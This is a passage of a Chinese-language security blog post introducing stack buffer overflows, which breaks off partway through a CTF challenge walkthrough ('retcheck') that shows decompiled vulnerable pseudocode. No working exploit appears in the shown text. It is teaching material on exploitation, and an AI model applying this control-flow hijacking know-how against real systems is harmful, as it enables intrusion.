<!DOCTYPE html><html domain="tech-blog.cymetrics.io" ga-id="G-3VBVCXV9Z0" lang="zh-TW"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="CYBER,Cymetrics,Security" name="keywords"><link href="/img/favicon/favicon-192x192.png?hash=42b087227d" rel="icon" type="image/png"><meta content="#5789d3" name="theme-color"><title>PWN 入門 - buffer overflow 是什麼？</title><meta content="PWN 入門 - buffer overflow 是什麼？" property="og:title"><meta content="PWN 入門 - buffer overflow 是什麼？" name="twitter:title"><meta content="summary" name="twitter:card"><meta content="你可能在很多 CVE 裡都看過 buffer overflow 這個名詞，但你知道這個弱點是如何引發 RCE 這麼嚴重的問題的嗎？這次讓我們來透過幾個簡單小題目看看 buffer overflow 如何發生，又該如何 exploit。" name="description"><meta content="你可能在很多 CVE 裡都看過 buffer overflow 這個名詞，但你知道這個弱點是如何引發 RCE 這麼嚴重的問題的嗎？這次讓我們來透過幾個簡單小題目看看 buffer overflow 如何發生，又該如何 exploit。" name="twitter:description"><meta content="你可能在很多 CVE 裡都看過 buffer overflow 這個名詞，但你知道這個弱點是如何引發 RCE 這麼嚴重的問題的嗎？這次讓我們來透過幾個簡單小題目看看 buffer overflow 如何發生，又該如何 exploit。" property="og:description"><meta content="article" property="og:type"><meta content="https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/" property="og:url"><meta content="Cymetrics Tech Blog" property="og:site_name"><meta content="https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/cover-2.jpg" property="og:image"><meta content="https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/cover-2.jpg" name="twitter:image"><meta content="hsZQwAip9iIbys-i4PJp_MfpNiA6w6RB0hYdWLiLUuk" name="google-site-verification"><link href="https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/" rel="canonical"><meta content="always" name="referrer"><link href="/feed/feed.xml" rel="alternate" type="application/atom+xml" title="Cymetrics Tech Blog"><link href="/" rel="preconnect" crossorigin=""><script async="" src="/js/min.js?hash=bcb67b09df" defer=""></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3VBVCXV9Z0"></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3VBVCXV9Z0');</script><script csp-hash="">if (/Mac OS X/.test(navigator.userAgent))document.documentElement.classList.add('apple')</script><style>:root{--primary-color: #5789d3;--primary-dark-color: #ffd349;--fgColor: #2f2f2f;--bgColor: linear-gradient(to top, #efefef, #ffffff);--primary: var(--primary-color);--primary-dark: var(--primary-dark-color);--fg: var(--fgColor);--bg: var(--bgColor);--progressColor: #ffd349;--main-width: calc(100vw - 3em)}main img{content-visibility:auto}article *{scroll-margin-top:50px}header nav{z-index:1;position:fixed;top:0;left:0;width:100vw;background:#fff;font-weight:200;text-align:right;padding:0}@media (min-width:37.5em){:root{--main-width: calc(37.5em - 3em)}}dialog,share-widget{position:fixed;opacity:.9}share-widget{right:20px;bottom:20px;width:50px;height:50px;border-radius:50%;overflow:hidden;box-shadow:2px 3px 5px 2px rgba(0,0,0,.2)}@media screen and (max-width:376px){share-widget{display:none}}share-widget div{margin-left:50%;transform:translateX(-50%);width:20px;height:20px;background-image:url(/img/share.svg);background-repeat:no-repeat;background-position:center;background-size:contain}.apple share-widget div{background-image:url(/img/share-apple.svg)}share-widget button{margin:0;padding:0;width:100%;height:100%;transition:.3s}share-widget button:active{transform:scale(1.2)}dialog{background-color:var(--primary-dark);z-index:1000;font-size:14px}#reading-progress{z-index:1;background-color:var(--progressColor);width:100vw;position:absolute;left:0;bottom:0;height:2px;transform:translate(-100vw,0);will-change:transform;pointer-events:none}#posts li{margin-bottom:.5em}html{line-height:1.15;-webkit-text-size-adjust:100%;font-family:"Open Sans",-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans","Helvetica Neue",Helvetica,Arial,"Noto Sans TC","PingFang TC","Hiragino Sans GB","Heiti TC","Microsoft YaHei","Microsoft Jhenghei",sans-serif;--font-family: "Open Sans", -apple-system, system-ui, BlinkMacSystemFont,
    "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Helvetica, Arial,
    "Noto Sans TC", "PingFang TC", "Hiragino Sans GB", "Heiti TC",
    "Microsoft YaHei", "Microsoft Jhenghei", sans-serif}body,figure{margin:0}body.lock{overflow:hidden}a{background-color:transparent;text-underline-offset:2px;text-decoration:none;color:var(--primary)}b,strong{font-weight:700}img{border-style:none;max-width:100%;height:auto;margin:0 auto}button,input{font-family:inherit;font-size:100%;line-height:1.15;overflow:visible}button{text-transform:none}input{margin:0}[type=button],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}summary{display:list-item}h2{font-size:2.5em;line-height:1.2;margin-bottom:.6em;line-height:2.4rem;margin-bottom:1.36rem;font-size:1.728rem}h3{font-size:2em;line-height:1.125;margin-bottom:.75em;font-size:1.4rem;line-height:1.5rem;margin-bottom:1rem}body,ol,p,pre,ul{font-size:1em}ol,p,pre,ul{margin-bottom:1.5em}body,ol,p,pre,ul{font-size:1rem;line-height:1.6}ol,p,pre,ul{margin-bottom:1.36rem}@media (min-width:600px){h2{font-size:2.0097rem;line-height:2.52rem}h3{font-size:1.7989rem;line-height:2rem}body,ol,p,pre,ul{font-size:1.1rem;line-height:1.6}h2,h3,ol,p,pre,ul{margin-bottom:1.496rem}}@media (min-width:1200px){h2{font-size:2.05rem}h3{font-size:1.5rem}body,ol,p,pre,ul{font-size:1.2rem;line-height:1.6}h2,h3,ol,p,pre,ul{margin-bottom:1.632rem}}code,pre{overflow-x:auto}pre{font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace}pre code:not([class]){overflow-x:scroll}code{border-radius:.3em;color:#e33671;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:90%}h1,h2,h3{font-family:var(--font-family)}a:hover{text-decoration:underline}figcaption{color:#757575;margin-top:.75em;text-align:center}figcaption>p{margin:0;font-size:90%}button,input{border-radius:.3em;max-width:100%}input{padding:.75em;margin-bottom:1.5em;display:inline}button+label,input+label,label+*{page-break-before:always}button,label{display:inline-block}button{background:#f2f2f2;color:#191919;cursor:pointer;padding:.75em 1.5em;text-align:center;margin:0 .75em 1.5em 0}button:hover{background:#d9d9d9;color:#000}button:not([disabled]){background:#f9c412;color:#181818;background:var(--primary)}button:not([disabled]):hover{background:#ba9005;color:#000;background:var(--primary-dark)}input[type=file],input[type=number],input[type=range],input[type=url]{border:1px solid #595959;padding:.75em}*{border:0;box-sizing:border-box}body{font-family:var(--font-family);background:var(--bg);color:var(--fg)}figure img,header label{display:block}article,header{max-width:100%;width:42.5em;margin:0 auto}header{padding:4.5em 24px 0;text-align:center;flex-direction:column}header p,ol,ul{margin-top:0}header nav .nav-title{float:left;font-size:inherit;line-height:inherit;margin:0;text-align:left}header nav label{color:#000;cursor:pointer;margin:0;font-style:normal;text-align:right}main{max-width:70rem;margin:0 auto;min-height:60vh}article{padding:1.5em;word-break:break-word}li ol,li ul{margin-bottom:0}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto;background:#2d2d2d}.token.comment{color:#999}.token.punctuation{color:#ccc}.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property{color:#f8c555}.token.builtin,.token.keyword{color:#cc99cd}.token.char,.token.string{color:#7ec699}.token.operator,.token.url{color:#67cdcc}.nav__links a,.token.bold{font-weight:700}.token.inserted{color:green}.w-full{width:100%}body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color);--paginationCurrentColor: #666356}@media (prefers-color-scheme:dark){body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color);--paginationCurrentColor: #666356}}h1{font-size:32px;line-height:1.25;margin:.67em 0;text-align:left}header aside{font-size:16px;color:#4b4b4b}.post,footer{border-top:1px solid #ccc}.post{padding-top:35px;margin-top:35px}.menu__btn{display:inline-block;width:24px;height:24px;position:relative}.menu__btn span{opacity:0;width:1px;height:1px;overflow:hidden;display:block}.menu__btn::after,.menu__btn::before{content:"";position:absolute;top:51%;left:50%;height:2px;width:17px;background-color:#2d2d2d;border-radius:.1rem}.menu__btn::before{transform:translate(-50%,-50%);box-shadow:0 .3rem 0 #2d2d2d,0 -.3rem 0 #2d2d2d}.menu__btn::after{display:none;transform:translate(-50%,-50%) rotate(90deg)}.menu__btn.menu__btn--close{z-index:9;transform:rotate(45deg)}.menu__btn.menu__btn--close::before{box-shadow:none}.menu__btn.menu__btn--close::after{display:block}#nav,#nav .nav-title,header{display:flex;align-items:center}#nav{position:relative;height:68px;z-index:2}#nav .nav-title{padding:.375rem 1.5rem;width:100%;justify-content:space-between}#nav .nav-title *,.article-footer img{margin:0}.nav__links{display:none;flex-direction:column;position:fixed;z-index:3;top:0;left:0;right:0;bottom:0;padding:86px 48px 0;background-image:linear-gradient(to top,#efefef,#fff),linear-gradient(to bottom,#f9f9f9,#f9f9f9)}.nav__links--open{display:flex}.nav__links a{text-align:left;width:100%;padding:.5rem 0;transition:all .3s ease-out;text-decoration:none;color:var(--fg)}.nav__links a:hover{color:var(--primary-color)}.nav-logo{width:260px;height:40px;background:url(/img/logo1.png) no-repeat center center;background-size:contain}footer{margin-top:48px;font-size:14px;padding:24px;text-align:center}.copyright{display:inline-block}footer>*{margin:.5em}.footer-logos{display:flex;align-items:center;justify-content:center}.footer-logos a:not(:first-child){margin-left:32px}.post-tags{display:flex;gap:0 16px;flex-wrap:wrap}.direct-link{display:none}.post-avatar{margin-top:27px;display:flex;align-items:center;height:36px}.post-avatar__img{width:36px;height:36px;overflow:hidden;margin:0;border-radius:50%}.post-avatar__time{font-size:13px}.post-avatar__info{margin-left:8px;color:#747474;text-align:left}.post-avatar__author{font-size:14px;font-weight:700}.article-footer{margin-top:40px;border-bottom:1px solid #ccc;padding-bottom:52px}.article-footer a{float:right;display:flex;align-items:center;color:var(--fg);font-weight:700;margin-left:4px}.article-author{margin-top:34px;display:flex;align-items:flex-start;margin-bottom:48px}.article-author__img{width:80px;height:80px;overflow:hidden;margin:0;border-radius:50%;flex-shrink:0}.article-author__info{margin-left:16px;text-align:left}.article-author__title{color:#747474;font-size:16px}.article-author__author{font-size:22px;font-weight:700;line-height:1em}.article-author__intro{color:#2f2f2f;margin-top:8px}@media (min-width:768px){h1{font-size:48px}header aside{font-size:20px}header nav a:first-of-type{margin-left:auto}header nav a:last-of-type{margin-right:1.5em}.menu__btn{display:none}#nav,footer{max-width:1168px}#nav{height:80px;margin:0 auto}.nav-logo{width:313px}.nav__links{display:flex;flex-direction:row;position:static;padding:0;background-image:none}.nav__links a{text-align:center;margin-left:56px}footer{display:flex;flex-direction:row-reverse;justify-content:space-between;align-items:center;margin-left:auto;margin-right:auto}}</style></head><body><header><nav><div id="nav"><div class="nav-title"><a href="/" class="nav-logo" title="Homepage"></a> <label class="menu__btn" for="menu__control"><span>Menu</span></label></div><div class="nav__links"><a href="/archive/">Archive</a> <a href="/tags/">Tags</a> <a href="/about/">About</a></div></div><div id="reading-progress" aria-hidden="true"></div></nav><h1 class="w-full">PWN 入門 - buffer overflow 是什麼？</h1><aside class="w-full"><div class="post-tags"><a href="/tags/security/" class="post-tag">#Security</a> <a href="/tags/reverse-engineering/" class="post-tag">#Reverse Engineering</a> <a href="/tags/binary-exploitation/" class="post-tag">#Binary Exploitation</a></div><div class="post-avatar"><img src="/img/authors/crystal_logo.png" alt="crystal" class="post-avatar__img" data-deopt="true"><div class="post-avatar__info"><div class="post-avatar__author"><a href="/posts/crystal">crystal</a></div><div class="post-avatar__time">29 Sep 2021</div></div></div></aside><dialog id="message"></dialog></header><main><article><div id="post-page"></div><p>你可能在很多 CVE 裡都看過 buffer overflow 這個名詞，但你知道這個弱點是如何引發 RCE 這麼嚴重的問題的嗎？這次讓我們來透過幾個簡單小題目看看 buffer overflow 如何發生，又該如何 exploit。</p><p>在開始之前，請先閱讀 Reverse 101 的基礎篇：<a href="https://tech-blog.cymetrics.io/posts/crystal/reverse-01"><strong>Reverse Engineering 101 — Part 1</strong></a>，學習 pwn 的時候，了解記憶體分配與程式的運作方式是很重要的。</p><h2 id="what-is-buffer-overflow%3F"><a href="#what-is-buffer-overflow%3F" class="direct-link">#</a> What is buffer overflow?</h2><p>讓我們回顧一下函數的呼叫與執行是如何運作的。在 64 bit 的 Unix 系統中，參數會以暫存器傳遞（通常前六個為 <code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code> <code>r8</code> <code>r9</code>），而每一個函數內部會用到的變數以及結束後要返回繼續執行的指令位置等資料，會以一個 stack frame 的結構層層堆疊，並用 calling convention 管理 stack frame 的創建與銷毀。</p><p>先前我們看到的 stack frame 只是一個粉紅色的區塊，但現在我們要來更仔細的檢視這塊記憶體裡到底裝了什麼。</p><p>下面這邊是一段簡單的 C code，一開始會宣告一些區域變數，做一些運算邏輯，然後吃一段使用者輸入的名字到 name 這個長度為 64 byte 的字串裡，最後再把名字印出來。右邊是這個函數用到的記憶體空間，stack frame 底部會先放 function prologue 儲存好的 return address 以及舊的 rbp 位置，再往上才是函數內部用到的區域變數。這塊空間中，區域變數的順序 spec 並沒有規定，主要是 compiler 編譯時會根據一些優化規則跟記憶體 alignment 分配，然後把安排好的順序包進執行檔。</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/c-to-stack-1920w.webp 1920w, /img/posts/crystal/pwn-intro/c-to-stack-1280w.webp 1280w, /img/posts/crystal/pwn-intro/c-to-stack-840w.webp 840w, /img/posts/crystal/pwn-intro/c-to-stack-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/c-to-stack-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/c-to-stack-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/c-to-stack-840w.jpg 840w, /img/posts/crystal/pwn-intro/c-to-stack-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/c-to-stack-1920w.jpg" height="615" width="1133" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1133 615'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAGCAYAAAAVMmT4AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA60lEQVQY00XLMU7CYADF8W+Sbk0aDA4M3XqfcgA6dO/QY/QATZcehRggREyMkCiCATQoxuDX0mKhAZr+jR30Le8Nvyc6nQ6+7xMEAZ7nVTtJU3IpydfvfE4myOWSLMsQrVYLIQS6rqMoCpf1OtF2Sz6fE3e7pIMB3+Mx59MJ0W63/7CmaVw1GmSHA+fViqjX56vfZ//wSHEu/nGz2URV1eok45jsbUY0uiaZ9dgubtntUoRpmhU2DKPqi1qNKJJ8bBKG91OGoyde1hvKskSEYYht27iui2VZOI7D6Xgk2Rc8v0pu7qYsVpLf/ABeArne11DavQAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>simple C code and stack frame</p></figcaption></figure><p></p><p>這些為區域變數預留好的空間，就是一個一個的 buffer，當變數被賦值或是寫入的時候，資料就會填入這些記憶體。在程式開發者預設的情況下，使用者的名字幾乎不會超過 64 byte，所以他預期用戶輸入名字之後，記憶體就會長得像下面左邊的樣子，一個蘿蔔一個坑。</p><p>但是，這裡有一個致命的缺點。在 C 語言中，<code>gets(char s*)</code> 這個函數會從 stdin 讀取一行字並存到 s 指到的記憶體位置中，所謂『一行字』就是說，在遇到換行符號或 EOF 前都會一直讀下去。</p><p>你可能發現問題在哪了：當讀取的字串長度超過了分配的記憶體大小會怎麼樣呢？</p><p>答案就是：會把後面的記憶體空間覆寫過去，這就叫做溢位（overflow）。</p><p>那溢位又會如何？別忘了，當你把區域變數的空間都蓋過去了，下面兩塊記體就是舊的 rbp 位置跟函數結束後要回復執行的 return address。如果再多寫一點蓋過去，那你就可以竄改 return address，掌控程式的運作流程（hijack control flow），執行你想要的邏輯！下圖右邊就是當你輸入一大串的 A 把記憶體都填滿之後會噴的錯誤，因為 return address 指向不存在程式邏輯的 0xAAAAAAAA 所以導致程式 crash 報出 segmentation fault 的錯誤。</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/stack-overflow-1920w.webp 1920w, /img/posts/crystal/pwn-intro/stack-overflow-1280w.webp 1280w, /img/posts/crystal/pwn-intro/stack-overflow-840w.webp 840w, /img/posts/crystal/pwn-intro/stack-overflow-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/stack-overflow-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/stack-overflow-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/stack-overflow-840w.jpg 840w, /img/posts/crystal/pwn-intro/stack-overflow-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/stack-overflow-1920w.jpg" height="748" width="958" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 958 748'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAHCAYAAADam2dgAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6ElEQVQY0z2OvU7CUACF7xP5BCxubkxsLkyEMPAIvAnMJAhRVxa1SZFSE9K0CgliadHUpg0//bmlxs8bBs9whpPv5BwR+j5zTWPnupzimJ+yZGGaeI7D92qFTBJEYNu8jkZsx2OOlkWR55iDAQ+9Ho/dLrvNBiGVSdXMZjMS2+GkoMN0SmoYJJMJMggQeeASW09k62cVOJRFgadKvoLWuk4aRWouOqC/vKEZFu+fEUhJ1umwaLUI221Q38QxK9mGKd7Xnn0OH8sl940Gd80mt/U6er+P4F+/Z78ZDrmsVrmq1bioVLhW4B/TEtcU0CABiQAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>buffer overflow!</p></figcaption></figure><p></p><p>以上就是最基礎的 stack-based buffer overflow 模型。在 pwn 的題目中，我們的目標就是要想辦法控制 return address 來達到 RCE。再來讓我們用幾個簡單的小題目實際練習一下吧！</p><h2 id="simple-retaddr-overwrite---retcheck"><a href="#simple-retaddr-overwrite---retcheck" class="direct-link">#</a> Simple retaddr overwrite - retcheck</h2><p>第一個簡單的小範例我們用 2021 Hactivitycon CTF 的暖身題 retcheck 示範如何篡改 return address。你可以在<a href="https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/retcheck" rel="noopener noreferrer" target="_blank">這裡</a>下載擋案自己練習。</p><p>跟之前 reverse 的方法一樣，我們先跑一次看看。你會發現它就是跟使用者要一行輸入，然後就結束了，非常簡短。</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-run-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-run-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-run-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-run-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-run-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-run-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-run-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-run-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-run-1920w.jpg" height="154" width="944" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 944 154'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAADCAYAAABxhjRXAAAACXBIWXMAABYlAAAWJQFJUiTwAAAArUlEQVQI12WO2w7BQBgG+xpCwu7fRYs61qqLqlOIOERJEYn3f4uxqUsXk2+uJp+30B2OEnI1XQodkAcR49ESP3kj0wKJ78jk6vzxW4exBYPpitimpNnescO0+njzzYlD/mI4XzGYZdh0x3Cc0DQhWjURCdDSKV3r9g/nyp1Q0nN0S8REeGtXzNsR+5pwrjTYVhVhkKDsC98+/5758Y3GKOdy/zBLMuoqLEPa7/EFM6xbD8Xr4DsAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>running retcheck</p></figcaption></figure><p></p><p>用 <code>file</code> 得知檔案 not stripped 所以 symbols 都還在，然後用 GDB 打開這個檔案看一下 <code>main()</code> ，發現只是去呼叫 <code>vuln()</code> 這個函數。</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-main-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-main-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-main-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-main-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-main-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-main-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-main-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-main-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-main-1920w.jpg" height="396" width="888" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 888 396'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAFCAYAAABxeg0vAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAwklEQVQI1z2PS26DMABEOUrFxwSCYyAktgnUpW7UiFSqqizSX9r7n+IVedHVaKSZN5pIdhPrw5XGfVHZC42ZOQweqQyn+Y1hfCLJNsSpDBrFuUaYG5n9Id1/UHQz2jiyvMbYibYbmPx58SqUorS05PabVX9D6HfWu/NC9ZTVDm0fkI3D+iuqNtSyJkoKi1joov8l058U25l7d6TaaEw/oRobVpKFHhb21mPGF9zxwvj4ihmeWZUtqVDkRRtCd3H1/+EP/o5hwfYwtQsAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>main function</p></figcaption></figure><p></p><p>再來跟進到 <code>vuln()</code> 看看做了哪些事。扣除跟使用者要輸入的核心邏輯，這題特別處理的地方是一開始把 return address 存起來（到 <code>0x404030</code>），最後再檢查 return address 的值是不是跟存起來的一樣，如果有被改動就會觸發 <code>abort</code>。</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-vuln-1920w.webp 1920w, /img/posts/crystal/pwn-intro/retcheck-vuln-1280w.webp 1280w, /img/posts/crystal/pwn-intro/retcheck-vuln-840w.webp 840w, /img/posts/crystal/pwn-intro/retcheck-vuln-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-vuln-1920w.jpg 1920w, /img/posts/crystal/pwn-intro/retcheck-vuln-1280w.jpg 1280w, /img/posts/crystal/pwn-intro/retcheck-vuln-840w.jpg 840w, /img/posts/crystal/pwn-intro/retcheck-vuln-320w.jpg 320w" type="image/jpeg"><img src="/img/posts/crystal/pwn-intro/retcheck-vuln-1920w.jpg" height="1118" width="1522" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1522 1118'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAHCAYAAADam2dgAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAv0lEQVQY0yWP246CMBRF+ZTRUi7KpWNLC4KgiZnoiw9qJNH//441pT7snIezsi9RY6/o4Yba9WgzECc1P6JgHZdeBSt/o9i9yboPxk647sT574ZpDqRbi0gNef5LlDR3Mvf00IjSB4bpQl1p1rJGJArpnaPEvsjbmcZNHhrpxwuq2hFnBiGrb1yAuhnbHoPbdLpiTM+msMEtOEnzILXP0GeJc/szSrkwQKT626nYvyj7OUCbskUuj6wK64TXEvcPyjBkhVCUHr4AAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><figcaption><p>vuln function</p></figcaption></figure><p></p><p>我們可以寫成核心邏輯如下：</p><pre class="language-c"><code class="language-c"><span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><br><br>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token keyword directive">get</span> <span class="token expression">current <span class="token keyword">return</span> address</span></span><br>    RETADDR <span class="token operator">=</span> in_stack_0000<span class="token punctuation">;</span><br>    <br>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"retcheck enabled!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    l <span class="token operator">=</span> <span class="token function">strcspn</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    buf<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\00"</span><span class="token punctuation">;</span><br><br>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token keyword directive">check</span> <span class="token expression"><span class="token keyword">if</span> <span class="token keyword">return</span> address is modified</span></span><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span>in_stack_0000 <span class="token operator">!=</span> RETADDR<span class="token punctuation">)</span><span class="token punctuation">{</span><br>        <span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br>    <span class="token keyword">return</span><br><span class="token punctuation">}</span>  </code></pre><p>接下來該如何 exploit 呢？我們的策略是：判斷我們有哪些可以利用的弱點，找到可以 overflow 的地方，嘗試成功蓋過 return address，最後考慮如何避過檢查機制。</p><p>先檢查這個檔案使用了哪些記憶體保護機制：</p><p></p><figure><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/crystal/pwn-intro/retcheck-checksec-1920w.webp 1920w, 